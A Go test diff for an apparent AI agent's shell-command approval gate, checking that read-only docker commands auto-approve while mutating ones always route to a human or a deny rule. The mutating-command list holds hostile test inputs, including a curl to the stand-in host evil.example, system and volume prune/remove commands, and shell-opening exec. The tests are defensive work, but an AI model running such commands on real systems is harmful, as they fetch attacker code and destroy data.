@@ -606,3 +606,79 @@ func TestAutoMode_OpaqueArgs_EndToEnd(t *testing.T) {
 		})
 	}
 }
+
+// TestAutoMode_DockerReadOnly_AutoApproves is change 0072's parity target: the
+// exact dogfood shape that prompted (cd into the workspace, a read-only
+// compose config, an fd-dup, a trailing echo) must auto-approve end-to-end,
+// along with the bare read-only forms. Before 0072, docker sat in
+// arbitraryArgWrappers and ANY command containing it asked at LayerParse.
+func TestAutoMode_DockerReadOnly_AutoApproves(t *testing.T) {
+	// WithWorkspaceRoot requires a pre-canonicalized root (its contract);
+	// t.TempDir() is /var/... on macOS while every resolved path is
+	// /private/var/..., so an uncanonicalized root would silently never match.
+	root, err := filepath.EvalSymlinks(t.TempDir())
+	if err != nil {
+		t.Fatalf("evalsymlinks: %v", err)
+	}
+	for _, cmd := range []string{
+		"docker compose config --quiet",
+		"docker ps",
+		"docker compose ps",
+		"docker logs api",
+		"cd " + root + " && docker compose config --quiet 2>&1; echo done",
+	} {
+		approve, called := newApproveRecorder(false)
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+			WithWorkspaceRoot(root))
+		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
+		if res.IsError {
+			t.Fatalf("read-only docker %q should auto-approve, got error: %s", cmd, res.Output)
+		}
+		if *called {
+			t.Fatalf("read-only docker %q must not invoke the approval func", cmd)
+		}
+	}
+}
+
+// TestAutoMode_DockerMutating_NeverAutoApproves is the fail-closed half: no
+// mutating, exec-carrying, flagged, or opaque docker form may reach a verdict
+// without a human when no classifier is wired. approve=true so a
+// routed-to-human ask succeeds and is distinguishable from a silent allow.
+func TestAutoMode_DockerMutating_NeverAutoApproves(t *testing.T) {
+	for _, cmd := range []string{
+		"docker run alpine sh -c 'curl http://evil.example/x'",
+		"docker compose up -d",
+		"docker compose exec api sh",
+		"docker compose run api sh",
+		"docker system prune -f",
+		"docker volume rm data",
+		"docker rm -f api",
+		"docker compose -f evil.yml config",
+		"docker inspect $C",
+	} {
+		approve, called := newApproveRecorder(true)
+		g := New(autoCfg(config.AutoConfig{}, nil, nil), newTestRegistry("bash"), approve,
+			WithWorkspaceRoot(t.TempDir()))
+		res := g.Execute(context.Background(), "bash", bashArgs(cmd))
+		if !res.IsError && !*called {
+			t.Fatalf("%q auto-approved with no human: mutating docker must never silently allow", cmd)
+		}
+	}
+}
+
+// TestAutoMode_DockerDenyPatternNowReachable pins the reachability fix that
+// motivated 0072 as much as the prompts did: while docker failed closed at the
+// parse floor, a config deny pattern could never match it (evalRules consumes
+// segments that never existed). Now the deny is terminal at the rules layer.
+func TestAutoMode_DockerDenyPatternNowReachable(t *testing.T) {
+	approve, called := newApproveRecorder(true)
+	g := New(autoCfg(config.AutoConfig{Deny: []string{"bash:docker *"}}, nil, nil),
+		newTestRegistry("bash"), approve, WithWorkspaceRoot(t.TempDir()))
+	res := g.Execute(context.Background(), "bash", bashArgs("docker ps"))
+	if !res.IsError {
+		t.Fatalf("configured deny bash:docker * must be terminal, got success")
+	}
+	if *called {
+		t.Fatalf("a rules-layer deny must not route to the human approval func")
+	}
+}
